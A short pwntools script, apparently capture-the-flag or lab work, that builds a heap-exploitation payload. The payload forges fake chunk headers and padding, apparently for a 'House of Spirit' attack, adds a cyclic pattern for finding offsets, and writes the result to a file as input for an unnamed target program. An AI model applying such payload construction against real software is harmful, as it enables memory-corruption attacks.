from pwn import *

payload  = p64(0)       
payload += p64(0x41)      
payload = payload.ljust(0x40, b"B")
payload += p64(0)         
payload += p64(0x41)      
payload = payload.ljust(0x90, b"C")

pattern = cyclic(200)

full = b"1\n" + payload + pattern
open('/tmp/hos_input', 'wb').write(full)
print('len_payload1', len(payload))
print('len_pattern', len(pattern))
print('total', len(full))